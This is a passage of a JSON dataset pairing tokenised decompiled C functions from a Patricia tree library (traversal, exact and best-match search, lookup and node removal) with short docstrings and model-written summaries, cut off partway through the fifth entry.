    },
    {
        "id": 358,
        "docstring_tokens": [
            "This",
            "code",
            "recursively",
            "traverses",
            "a",
            "patricia",
            "tree",
            "in",
            "inorder",
            "fashion",
            ",",
            "calling",
            "a",
            "function",
            "on",
            "each",
            "node",
            "'s",
            "prefix",
            "and",
            "data",
            "."
        ],
        "code_tokens": [
            "size_t",
            "__cdecl",
            "FUN0",
            "(",
            "patricia_node_t",
            "*",
            "node",
            ",",
            "void_fn_t",
            "func",
            ")",
            "{",
            "size_t",
            "n",
            ";",
            "n",
            "=",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "!",
            "func",
            ")",
            "_assert_fail",
            "(",
            "\"func\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x198u",
            ",",
            "\"patricia_walk_inorder\"",
            ")",
            ";",
            "if",
            "(",
            "node",
            "-",
            ">",
            "l",
            ")",
            "n",
            "=",
            "patricia_walk_inorder",
            "(",
            "node",
            "-",
            ">",
            "l",
            ",",
            "func",
            ")",
            ";",
            "if",
            "(",
            "node",
            "-",
            ">",
            "prefix",
            ")",
            "{",
            "func",
            "(",
            "node",
            "-",
            ">",
            "prefix",
            ",",
            "node",
            "-",
            ">",
            "data",
            ")",
            ";",
            "+",
            "+",
            "n",
            ";",
            "}",
            "if",
            "(",
            "node",
            "-",
            ">",
            "r",
            ")",
            "n",
            "+",
            "=",
            "patricia_walk_inorder",
            "(",
            "node",
            "-",
            ">",
            "r",
            ",",
            "func",
            ")",
            ";",
            "return",
            "n",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"inorder\" is likely used to traverse a binary search tree (BST) in inorder fashion, visiting nodes in ascending order of their values, and it probably works in conjunction with other functions like \"insert\", \"preorder\", \"postorder\", and \"search\" to manipulate and navigate the BST.",
            "The `patricia_walk` function likely iterates through nodes of a Patricia tree, executing a given callback function for each node encountered, facilitating traversal operations on the tree structure."
        ],
        "longer_label": "The provided code likely implements an inorder traversal function for a Patricia tree, recursively traversing the tree structure and executing a callback function for each node encountered, contributing to operations like insertion, searching, and traversal within the tree."
    },
    {
        "id": 359,
        "docstring_tokens": [
            "The",
            "code",
            "searches",
            "for",
            "an",
            "exact",
            "match",
            "in",
            "a",
            "Patricia",
            "tree",
            "given",
            "a",
            "prefix",
            "and",
            "returns",
            "the",
            "corresponding",
            "node",
            "if",
            "found",
            "."
        ],
        "code_tokens": [
            "patricia_node_t",
            "*",
            "FUN0",
            "patricia_search_exact",
            "(",
            "patricia_tree_t",
            "*",
            "patricia",
            ",",
            "prefix_t",
            "*",
            "prefix",
            ")",
            "{",
            "u_char",
            "*",
            "v3",
            ";",
            "u_char",
            "*",
            "v4",
            ";",
            "u_int",
            "bitlen",
            ";",
            "patricia_node_t",
            "*",
            "node",
            ";",
            "if",
            "(",
            "!",
            "patricia",
            ")",
            "_assert_fail",
            "(",
            "\"patricia\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x1B2u",
            ",",
            "\"patricia_search_exact\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "prefix",
            ")",
            "_assert_fail",
            "(",
            "\"prefix\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x1B3u",
            ",",
            "\"patricia_search_exact\"",
            ")",
            ";",
            "if",
            "(",
            "prefix",
            "-",
            ">",
            "bitlen",
            ">",
            "patricia",
            "-",
            ">",
            "maxbits",
            ")",
            "_assert_fail",
            "(",
            "\"prefix->bitlen <= patricia->maxbits\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x1B4u",
            ",",
            "\"patricia_search_exact\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "patricia",
            "-",
            ">",
            "head",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "node",
            "=",
            "patricia",
            "-",
            ">",
            "head",
            ";",
            "bitlen",
            "=",
            "prefix",
            "-",
            ">",
            "bitlen",
            ";",
            "while",
            "(",
            "bitlen",
            ">",
            "node",
            "-",
            ">",
            "bit",
            ")",
            "{",
            "if",
            "(",
            "(",
            "prefix",
            "-",
            ">",
            "add",
            ".",
            "sin6",
            ".",
            "__u6_addr8",
            "[",
            "node",
            "-",
            ">",
            "bit",
            ">",
            ">",
            "3",
            "]",
            "&",
            "(",
            "128",
            ">",
            ">",
            "(",
            "node",
            "-",
            ">",
            "bit",
            "&",
            "7",
            ")",
            ")",
            ")",
            "!",
            "=",
            "0",
            ")",
            "node",
            "=",
            "node",
            "-",
            ">",
            "r",
            ";",
            "else",
            "node",
            "=",
            "node",
            "-",
            ">",
            "l",
            ";",
            "if",
            "(",
            "!",
            "node",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "}",
            "if",
            "(",
            "bitlen",
            "<",
            "node",
            "-",
            ">",
            "bit",
            "|",
            "|",
            "!",
            "node",
            "-",
            ">",
            "prefix",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "if",
            "(",
            "bitlen",
            "!",
            "=",
            "node",
            "-",
            ">",
            "bit",
            ")",
            "_assert_fail",
            "(",
            "\"node->bit == bitlen\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x1E3u",
            ",",
            "\"patricia_search_exact\"",
            ")",
            ";",
            "if",
            "(",
            "node",
            "-",
            ">",
            "bit",
            "!",
            "=",
            "node",
            "-",
            ">",
            "prefix",
            "-",
            ">",
            "bitlen",
            ")",
            "_assert_fail",
            "(",
            "\"node->bit == node->prefix->bitlen\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x1E4u",
            ",",
            "\"patricia_search_exact\"",
            ")",
            ";",
            "v3",
            "=",
            "prefix_tochar",
            "(",
            "prefix",
            ")",
            ";",
            "v4",
            "=",
            "prefix_tochar",
            "(",
            "node",
            "-",
            ">",
            "prefix",
            ")",
            ";",
            "if",
            "(",
            "comp_with_mask",
            "(",
            "v4",
            ",",
            "v3",
            ",",
            "bitlen",
            ")",
            ")",
            "return",
            "node",
            ";",
            "else",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_assert` function is likely a custom assertion macro used within the provided code snippets to perform runtime checks on conditions, ensuring they are met during program execution, with its behavior potentially varying depending on compiler features."
        ],
        "longer_label": "The given code defines a function `patricia_search_exact` to search for an exact match in a Patricia tree data structure, asserting various conditions for validity, utilizing bitwise operations, and comparing prefixes with masks before returning the found node or NULL."
    },
    {
        "id": 360,
        "docstring_tokens": [
            "This",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "searches",
            "a",
            "given",
            "prefix",
            "in",
            "a",
            "patricia",
            "tree",
            "data",
            "structure",
            "and",
            "returns",
            "the",
            "best",
            "match",
            "node",
            "based",
            "on",
            "the",
            "prefix",
            "length",
            "and",
            "inclusivity",
            "parameter",
            "."
        ],
        "code_tokens": [
            "patricia_node_t",
            "*",
            "FUN0",
            "patricia_search_best2",
            "(",
            "patricia_tree_t",
            "*",
            "patricia",
            ",",
            "prefix_t",
            "*",
            "prefix",
            ",",
            "int",
            "inclusive",
            ")",
            "{",
            "int",
            "v4",
            ";",
            "int",
            "v5",
            ";",
            "u_int",
            "v6",
            ";",
            "u_char",
            "*",
            "v7",
            ";",
            "u_char",
            "*",
            "v8",
            ";",
            "int",
            "cnt",
            ";",
            "u_int",
            "bitlen",
            ";",
            "patricia_node_t",
            "*",
            "node",
            ";",
            "patricia_node_t",
            "*",
            "nodea",
            ";",
            "patricia_node_t",
            "*",
            "stack",
            "[",
            "129",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v14",
            ";",
            "v14",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "cnt",
            "=",
            "0",
            ";",
            "if",
            "(",
            "!",
            "patricia",
            ")",
            "_assert_fail",
            "(",
            "\"patricia\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x1FBu",
            ",",
            "\"patricia_search_best2\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "prefix",
            ")",
            "_assert_fail",
            "(",
            "\"prefix\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x1FCu",
            ",",
            "\"patricia_search_best2\"",
            ")",
            ";",
            "if",
            "(",
            "prefix",
            "-",
            ">",
            "bitlen",
            ">",
            "patricia",
            "-",
            ">",
            "maxbits",
            ")",
            "_assert_fail",
            "(",
            "\"prefix->bitlen <= patricia->maxbits\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x1FDu",
            ",",
            "\"patricia_search_best2\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "patricia",
            "-",
            ">",
            "head",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "node",
            "=",
            "patricia",
            "-",
            ">",
            "head",
            ";",
            "bitlen",
            "=",
            "prefix",
            "-",
            ">",
            "bitlen",
            ";",
            "do",
            "{",
            "if",
            "(",
            "bitlen",
            "<",
            "=",
            "node",
            "-",
            ">",
            "bit",
            ")",
            "break",
            ";",
            "if",
            "(",
            "node",
            "-",
            ">",
            "prefix",
            ")",
            "{",
            "v4",
            "=",
            "cnt",
            "+",
            "+",
            ";",
            "stack",
            "[",
            "v4",
            "]",
            "=",
            "node",
            ";",
            "}",
            "node",
            "=",
            "(",
            "prefix",
            "-",
            ">",
            "add",
            ".",
            "sin6",
            ".",
            "__u6_addr8",
            "[",
            "node",
            "-",
            ">",
            "bit",
            ">",
            ">",
            "3",
            "]",
            "&",
            "(",
            "128",
            ">",
            ">",
            "(",
            "node",
            "-",
            ">",
            "bit",
            "&",
            "7",
            ")",
            ")",
            ")",
            "!",
            "=",
            "0",
            "?",
            "node",
            "-",
            ">",
            "r",
            ":",
            "node",
            "-",
            ">",
            "l",
            ";",
            "}",
            "while",
            "(",
            "node",
            ")",
            ";",
            "if",
            "(",
            "inclusive",
            "&",
            "&",
            "node",
            "&",
            "&",
            "node",
            "-",
            ">",
            "prefix",
            ")",
            "{",
            "v5",
            "=",
            "cnt",
            "+",
            "+",
            ";",
            "stack",
            "[",
            "v5",
            "]",
            "=",
            "node",
            ";",
            "}",
            "if",
            "(",
            "cnt",
            "<",
            "=",
            "0",
            ")",
            "return",
            "0L",
            "L",
            ";",
            "while",
            "(",
            "-",
            "-",
            "cnt",
            ">",
            "=",
            "0",
            ")",
            "{",
            "nodea",
            "=",
            "stack",
            "[",
            "cnt",
            "]",
            ";",
            "v6",
            "=",
            "nodea",
            "-",
            ">",
            "prefix",
            "-",
            ">",
            "bitlen",
            ";",
            "v7",
            "=",
            "prefix_tochar",
            "(",
            "prefix",
            ")",
            ";",
            "v8",
            "=",
            "prefix_tochar",
            "(",
            "nodea",
            "-",
            ">",
            "prefix",
            ")",
            ";",
            "if",
            "(",
            "comp_with_mask",
            "(",
            "v8",
            ",",
            "v7",
            ",",
            "v6",
            ")",
            "&",
            "&",
            "bitlen",
            ">",
            "=",
            "nodea",
            "-",
            ">",
            "prefix",
            "-",
            ">",
            "bitlen",
            ")",
            "return",
            "nodea",
            ";",
            "}",
            "return",
            "0L",
            "L",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `_assert` function is likely used for runtime assertion checking in a C codebase, ensuring conditions are met and halting execution if not, possibly for debugging or error handling purposes."
        ],
        "longer_label": "The provided C function `patricia_search_best2` utilizes runtime assertion checks and a stack-based traversal algorithm to search for the best matching node in a patricia tree given a prefix, with the ability to include/exclude the matching node depending on the `inclusive` parameter."
    },
    {
        "id": 361,
        "docstring_tokens": [
            "The",
            "code",
            "performs",
            "a",
            "lookup",
            "operation",
            "in",
            "a",
            "Patricia",
            "tree",
            "data",
            "structure",
            "to",
            "find",
            "a",
            "specific",
            "node",
            "based",
            "on",
            "a",
            "given",
            "prefix",
            ",",
            "creating",
            "new",
            "nodes",
            "if",
            "necessary",
            "with",
            "specific",
            "conditions",
            "and",
            "handling",
            "different",
            "cases",
            "within",
            "the",
            "tree",
            "structure",
            "."
        ],
        "code_tokens": [
            "patricia_node_t",
            "*",
            "FUN0",
            "patricia_lookup",
            "(",
            "patricia_tree_t",
            "*",
            "patricia",
            ",",
            "prefix_t",
            "*",
            "prefix",
            ")",
            "{",
            "unsigned",
            "int",
            "bit",
            ";",
            "uint8_t",
            "v4",
            ";",
            "unsigned",
            "int",
            "differ_bit",
            ";",
            "int",
            "i",
            ";",
            "int",
            "j",
            ";",
            "u_int",
            "bitlen",
            ";",
            "patricia_node_t",
            "*",
            "nodea",
            ";",
            "patricia_node_t",
            "*",
            "node",
            ";",
            "patricia_node_t",
            "*",
            "parent",
            ";",
            "$",
            "2902",
            "B91B1B41C59A3006230453FE8AC3",
            "*",
            "addr",
            ";",
            "u_char",
            "*",
            "test_addr",
            ";",
            "patricia_node_t",
            "*",
            "new_node",
            ";",
            "patricia_node_t",
            "*",
            "glue",
            ";",
            "if",
            "(",
            "!",
            "patricia",
            ")",
            "_assert_fail",
            "(",
            "\"patricia\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x25Eu",
            ",",
            "\"patricia_lookup\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "prefix",
            ")",
            "_assert_fail",
            "(",
            "\"prefix\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x25Fu",
            ",",
            "\"patricia_lookup\"",
            ")",
            ";",
            "if",
            "(",
            "prefix",
            "-",
            ">",
            "bitlen",
            ">",
            "patricia",
            "-",
            ">",
            "maxbits",
            ")",
            "_assert_fail",
            "(",
            "\"prefix->bitlen <= patricia->maxbits\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x260u",
            ",",
            "\"patricia_lookup\"",
            ")",
            ";",
            "if",
            "(",
            "patricia",
            "-",
            ">",
            "head",
            ")",
            "{",
            "addr",
            "=",
            "&",
            "prefix",
            "-",
            ">",
            "add",
            ";",
            "bitlen",
            "=",
            "prefix",
            "-",
            ">",
            "bitlen",
            ";",
            "node",
            "=",
            "patricia",
            "-",
            ">",
            "head",
            ";",
            "while",
            "(",
            "bitlen",
            ">",
            "node",
            "-",
            ">",
            "bit",
            "|",
            "|",
            "!",
            "node",
            "-",
            ">",
            "prefix",
            ")",
            "{",
            "if",
            "(",
            "node",
            "-",
            ">",
            "bit",
            "<",
            "patricia",
            "-",
            ">",
            "maxbits",
            "&",
            "&",
            "(",
            "addr",
            "-",
            ">",
            "sin6",
            ".",
            "__u6_addr8",
            "[",
            "node",
            "-",
            ">",
            "bit",
            ">",
            ">",
            "3",
            "]",
            "&",
            "(",
            "128",
            ">",
            ">",
            "(",
            "node",
            "-",
            ">",
            "bit",
            "&",
            "7",
            ")",
            ")",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "!",
            "node",
            "-",
            ">",
            "r",
            ")",
            "break",
            ";",
            "node",
            "=",
            "node",
            "-",
            ">",
            "r",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "!",
            "node",
            "-",
            ">",
            "l",
            ")",
            "break",
            ";",
            "node",
            "=",
            "node",
            "-",
            ">",
            "l",
            ";",
            "}",
            "if",
            "(",
            "!",
            "node",
            ")",
            "_assert_fail",
            "(",
            "\"node\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x292u",
            ",",
            "\"patricia_lookup\"",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "node",
            "-",
            ">",
            "prefix",
            ")",
            "_assert_fail",
            "(",
            "\"node->prefix\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x295u",
            ",",
            "\"patricia_lookup\"",
            ")",
            ";",
            "test_addr",
            "=",
            "(",
            "u_char",
            "*",
            ")",
            "&",
            "node",
            "-",
            ">",
            "prefix",
            "-",
            ">",
            "add",
            ";",
            "bit",
            "=",
            "node",
            "-",
            ">",
            "bit",
            ";",
            "if",
            "(",
            "bitlen",
            "<",
            "=",
            "node",
            "-",
            ">",
            "bit",
            ")",
            "bit",
            "=",
            "prefix",
            "-",
            ">",
            "bitlen",
            ";",
            "differ_bit",
            "=",
            "0",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "bit",
            ">",
            "8",
            "*",
            "i",
            ";",
            "+",
            "+",
            "i",
            ")",
            "{",
            "v4",
            "=",
            "addr",
            "-",
            ">",
            "sin6",
            ".",
            "__u6_addr8",
            "[",
            "i",
            "]",
            ";",
            "if",
            "(",
            "v4",
            "!",
            "=",
            "test_addr",
            "[",
            "i",
            "]",
            ")",
            "{",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            "j",
            "<",
            "=",
            "7",
            "&",
            "&",
            "(",
            "(",
            "unsigned",
            "__int8",
            ")",
            "(",
            "v4",
            "^",
            "test_addr",
            "[",
            "i",
            "]",
            ")",
            "&",
            "(",
            "128",
            ">",
            ">",
            "j",
            ")",
            ")",
            "=",
            "=",
            "0",
            ";",
            "+",
            "+",
            "j",
            ")",
            ";",
            "if",
            "(",
            "j",
            ">",
            "7",
            ")",
            "_assert_fail",
            "(",
            "\"j < 8\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x2AAu",
            ",",
            "\"patricia_lookup\"",
            ")",
            ";",
            "differ_bit",
            "=",
            "8",
            "*",
            "i",
            "+",
            "j",
            ";",
            "break",
            ";",
            "}",
            "differ_bit",
            "=",
            "8",
            "*",
            "(",
            "i",
            "+",
            "1",
            ")",
            ";",
            "}",
            "if",
            "(",
            "differ_bit",
            ">",
            "bit",
            ")",
            "differ_bit",
            "=",
            "bit",
            ";",
            "for",
            "(",
            "parent",
            "=",
            "node",
            "-",
            ">",
            "parent",
            ";",
            "parent",
            "&",
            "&",
            "differ_bit",
            "<",
            "=",
            "parent",
            "-",
            ">",
            "bit",
            ";",
            "parent",
            "=",
            "parent",
            "-",
            ">",
            "parent",
            ")",
            "node",
            "=",
            "parent",
            ";",
            "if",
            "(",
            "differ_bit",
            "=",
            "=",
            "bitlen",
            "&",
            "&",
            "bitlen",
            "=",
            "=",
            "node",
            "-",
            ">",
            "bit",
            ")",
            "{",
            "if",
            "(",
            "node",
            "-",
            ">",
            "prefix",
            ")",
            "{",
            "return",
            "node",
            ";",
            "}",
            "else",
            "{",
            "node",
            "-",
            ">",
            "prefix",
            "=",
            "Ref_Prefix",
            "(",
            "prefix",
            ")",
            ";",
            "if",
            "(",
            "node",
            "-",
            ">",
            "data",
            ")",
            "_assert_fail",
            "(",
            "\"node->data == NULL\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x2CEu",
            ",",
            "\"patricia_lookup\"",
            ")",
            ";",
            "return",
            "node",
            ";",
            "}",
            "}",
            "else",
            "{",
            "new_node",
            "=",
            "(",
            "patricia_node_t",
            "*",
            ")",
            "calloc",
            "(",
            "1uL",
            "L",
            ",",
            "0x38uL",
            "L",
            ")",
            ";",
            "new_node",
            "-",
            ">",
            "bit",
            "=",
            "prefix",
            "-",
            ">",
            "bitlen",
            ";",
            "new_node",
            "-",
            ">",
            "prefix",
            "=",
            "Ref_Prefix",
            "(",
            "prefix",
            ")",
            ";",
            "new_node",
            "-",
            ">",
            "parent",
            "=",
            "0L",
            "L",
            ";",
            "new_node",
            "-",
            ">",
            "r",
            "=",
            "0L",
            "L",
            ";",
            "new_node",
            "-",
            ">",
            "l",
            "=",
            "new_node",
            "-",
            ">",
            "r",
            ";",
            "new_node",
            "-",
            ">",
            "data",
            "=",
            "0L",
            "L",
            ";",
            "+",
            "+",
            "patricia",
            "-",
            ">",
            "num_active_node",
            ";",
            "if",
            "(",
            "differ_bit",
            "=",
            "=",
            "node",
            "-",
            ">",
            "bit",
            ")",
            "{",
            "new_node",
            "-",
            ">",
            "parent",
            "=",
            "node",
            ";",
            "if",
            "(",
            "node",
            "-",
            ">",
            "bit",
            "<",
            "patricia",
            "-",
            ">",
            "maxbits",
            "&",
            "&",
            "(",
            "addr",
            "-",
            ">",
            "sin6",
            ".",
            "__u6_addr8",
            "[",
            "node",
            "-",
            ">",
            "bit",
            ">",
            ">",
            "3",
            "]",
            "&",
            "(",
            "128",
            ">",
            ">",
            "(",
            "node",
            "-",
            ">",
            "bit",
            "&",
            "7",
            ")",
            ")",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "if",
            "(",
            "node",
            "-",
            ">",
            "r",
            ")",
            "_assert_fail",
            "(",
            "\"node->r == NULL\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x2DEu",
            ",",
            "\"patricia_lookup\"",
            ")",
            ";",
            "node",
            "-",
            ">",
            "r",
            "=",
            "new_node",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "node",
            "-",
            ">",
            "l",
            ")",
            "_assert_fail",
            "(",
            "\"node->l == NULL\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x2E2u",
            ",",
            "\"patricia_lookup\"",
            ")",
            ";",
            "node",
            "-",
            ">",
            "l",
            "=",
            "new_node",
            ";",
            "}",
            "return",
            "new_node",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "bitlen",
            "=",
            "=",
            "differ_bit",
            ")",
            "{",
            "if",
            "(",
            "bitlen",
            "<",
            "patricia",
            "-",
            ">",
            "maxbits",
            "&",
            "&",
            "(",
            "(",
            "128",
            ">",
            ">",
            "(",
            "bitlen",
            "&",
            "7",
            ")",
            ")",
            "&",
            "test_addr",
            "[",
            "bitlen",
            ">",
            ">",
            "3",
            "]",
            ")",
            "!",
            "=",
            "0",
            ")",
            "new_node",
            "-",
            ">",
            "r",
            "=",
            "node",
            ";",
            "else",
            "new_node",
            "-",
            ">",
            "l",
            "=",
            "node",
            ";",
            "new_node",
            "-",
            ">",
            "parent",
            "=",
            "node",
            "-",
            ">",
            "parent",
            ";",
            "if",
            "(",
            "node",
            "-",
            ">",
            "parent",
            ")",
            "{",
            "if",
            "(",
            "node",
            "=",
            "=",
            "node",
            "-",
            ">",
            "parent",
            "-",
            ">",
            "r",
            ")",
            "node",
            "-",
            ">",
            "parent",
            "-",
            ">",
            "r",
            "=",
            "new_node",
            ";",
            "else",
            "node",
            "-",
            ">",
            "parent",
            "-",
            ">",
            "l",
            "=",
            "new_node",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "node",
            "!",
            "=",
            "patricia",
            "-",
            ">",
            "head",
            ")",
            "_assert_fail",
            "(",
            "\"patricia->head == node\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x2F6u",
            ",",
            "\"patricia_lookup\"",
            ")",
            ";",
            "patricia",
            "-",
            ">",
            "head",
            "=",
            "new_node",
            ";",
            "}",
            "node",
            "-",
            ">",
            "parent",
            "=",
            "new_node",
            ";",
            "}",
            "else",
            "{",
            "glue",
            "=",
            "(",
            "patricia_node_t",
            "*",
            ")",
            "calloc",
            "(",
            "1uL",
            "L",
            ",",
            "0x38uL",
            "L",
            ")",
            ";",
            "glue",
            "-",
            ">",
            "bit",
            "=",
            "differ_bit",
            ";",
            "glue",
            "-",
            ">",
            "prefix",
            "=",
            "0L",
            "L",
            ";",
            "glue",
            "-",
            ">",
            "parent",
            "=",
            "node",
            "-",
            ">",
            "parent",
            ";",
            "glue",
            "-",
            ">",
            "data",
            "=",
            "0L",
            "L",
            ";",
            "+",
            "+",
            "patricia",
            "-",
            ">",
            "num_active_node",
            ";",
            "if",
            "(",
            "differ_bit",
            "<",
            "patricia",
            "-",
            ">",
            "maxbits",
            "&",
            "&",
            "(",
            "(",
            "128",
            ">",
            ">",
            "(",
            "differ_bit",
            "&",
            "7",
            ")",
            ")",
            "&",
            "addr",
            "-",
            ">",
            "sin6",
            ".",
            "__u6_addr8",
            "[",
            "differ_bit",
            ">",
            ">",
            "3",
            "]",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "glue",
            "-",
            ">",
            "r",
            "=",
            "new_node",
            ";",
            "glue",
            "-",
            ">",
            "l",
            "=",
            "node",
            ";",
            "}",
            "else",
            "{",
            "glue",
            "-",
            ">",
            "r",
            "=",
            "node",
            ";",
            "glue",
            "-",
            ">",
            "l",
            "=",
            "new_node",
            ";",
            "}",
            "new_node",
            "-",
            ">",
            "parent",
            "=",
            "glue",
            ";",
            "if",
            "(",
            "node",
            "-",
            ">",
            "parent",
            ")",
            "{",
            "if",
            "(",
            "node",
            "=",
            "=",
            "node",
            "-",
            ">",
            "parent",
            "-",
            ">",
            "r",
            ")",
            "node",
            "-",
            ">",
            "parent",
            "-",
            ">",
            "r",
            "=",
            "glue",
            ";",
            "else",
            "node",
            "-",
            ">",
            "parent",
            "-",
            ">",
            "l",
            "=",
            "glue",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "node",
            "!",
            "=",
            "patricia",
            "-",
            ">",
            "head",
            ")",
            "_assert_fail",
            "(",
            "\"patricia->head == node\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x318u",
            ",",
            "\"patricia_lookup\"",
            ")",
            ";",
            "patricia",
            "-",
            ">",
            "head",
            "=",
            "glue",
            ";",
            "}",
            "node",
            "-",
            ">",
            "parent",
            "=",
            "glue",
            ";",
            "}",
            "return",
            "new_node",
            ";",
            "}",
            "}",
            "}",
            "else",
            "{",
            "nodea",
            "=",
            "(",
            "patricia_node_t",
            "*",
            ")",
            "calloc",
            "(",
            "1uL",
            "L",
            ",",
            "0x38uL",
            "L",
            ")",
            ";",
            "nodea",
            "-",
            ">",
            "bit",
            "=",
            "prefix",
            "-",
            ">",
            "bitlen",
            ";",
            "nodea",
            "-",
            ">",
            "prefix",
            "=",
            "Ref_Prefix",
            "(",
            "prefix",
            ")",
            ";",
            "nodea",
            "-",
            ">",
            "parent",
            "=",
            "0L",
            "L",
            ";",
            "nodea",
            "-",
            ">",
            "r",
            "=",
            "0L",
            "L",
            ";",
            "nodea",
            "-",
            ">",
            "l",
            "=",
            "nodea",
            "-",
            ">",
            "r",
            ";",
            "nodea",
            "-",
            ">",
            "data",
            "=",
            "0L",
            "L",
            ";",
            "patricia",
            "-",
            ">",
            "head",
            "=",
            "nodea",
            ";",
            "+",
            "+",
            "patricia",
            "-",
            ">",
            "num_active_node",
            ";",
            "return",
            "nodea",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code implements a function `patricia_lookup` for searching a prefix in a patricia tree, handling various cases including insertion of new nodes, updating existing nodes, and ensuring proper tree structure, with annotations needed for deeper understanding."
    },
    {
        "id": 362,
        "docstring_tokens": [
            "The",
            "code",
            "removes",
            "a",
            "node",
            "from",
            "a",
            "Patricia",
            "tree",
            "structure",
            ",",
            "updating",
            "the",
            "parent",
            "and",
            "child",
            "nodes",
            "accordingly",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "patricia_tree_t",
            "*",
            "patricia",
            ",",
            "patricia_node_t",
            "*",
            "node",
            ")",
            "{",
            "patricia_node_t",
            "*",
            "child",
            ";",
            "_patricia_node_t",
            "*",
            "childa",
            ";",
            "_patricia_node_t",
            "*",
            "parent",
            ";",
            "_patricia_node_t",
            "*",
            "parenta",
            ";",
            "if",
            "(",
            "!",
            "patricia",
            ")",
            "_assert_fail",
            "(",
            "\"patricia\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x330u",
            ",",
            "\"patricia_remove\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "node",
            ")",
            "_assert_fail",
            "(",
            "\"node\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x331u",
            ",",
            "\"patricia_remove\"",
            ")",
            ";",
            "if",
            "(",
            "node",
            "-",
            ">",
            "r",
            "&",
            "&",
            "node",
            "-",
            ">",
            "l",
            ")",
            "{",
            "if",
            "(",
            "node",
            "-",
            ">",
            "prefix",
            ")",
            "Deref_Prefix",
            "(",
            "node",
            "-",
            ">",
            "prefix",
            ")",
            ";",
            "node",
            "-",
            ">",
            "prefix",
            "=",
            "0L",
            "L",
            ";",
            "node",
            "-",
            ">",
            "data",
            "=",
            "0L",
            "L",
            ";",
            "}",
            "else",
            "if",
            "(",
            "node",
            "-",
            ">",
            "r",
            "|",
            "|",
            "node",
            "-",
            ">",
            "l",
            ")",
            "{",
            "if",
            "(",
            "node",
            "-",
            ">",
            "r",
            ")",
            "{",
            "childa",
            "=",
            "node",
            "-",
            ">",
            "r",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "!",
            "node",
            "-",
            ">",
            "l",
            ")",
            "_assert_fail",
            "(",
            "\"node->l\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x37Bu",
            ",",
            "\"patricia_remove\"",
            ")",
            ";",
            "childa",
            "=",
            "node",
            "-",
            ">",
            "l",
            ";",
            "}",
            "parenta",
            "=",
            "node",
            "-",
            ">",
            "parent",
            ";",
            "childa",
            "-",
            ">",
            "parent",
            "=",
            "parenta",
            ";",
            "Deref_Prefix",
            "(",
            "node",
            "-",
            ">",
            "prefix",
            ")",
            ";",
            "free",
            "(",
            "node",
            ")",
            ";",
            "-",
            "-",
            "patricia",
            "-",
            ">",
            "num_active_node",
            ";",
            "if",
            "(",
            "parenta",
            ")",
            "{",
            "if",
            "(",
            "node",
            "=",
            "=",
            "parenta",
            "-",
            ">",
            "r",
            ")",
            "{",
            "parenta",
            "-",
            ">",
            "r",
            "=",
            "childa",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "node",
            "!",
            "=",
            "parenta",
            "-",
            ">",
            "l",
            ")",
            "_assert_fail",
            "(",
            "\"parent->l == node\"",
            ",",
            "\"patricia.c\"",
            ",",
            "0x38Fu",
            ",",
            "\"patricia_remove\"",
            ")",
            ";",
            "parenta",
            "-",
            ">",
            "l",
            "=",
            "childa",
            ";",
            "}",
            "}",
            "else",
            "{",
            "if",
            "(",
            "node",
            "!",
            "=",
            "patricia",
            "-",
            ">",
            "head",
            ")",
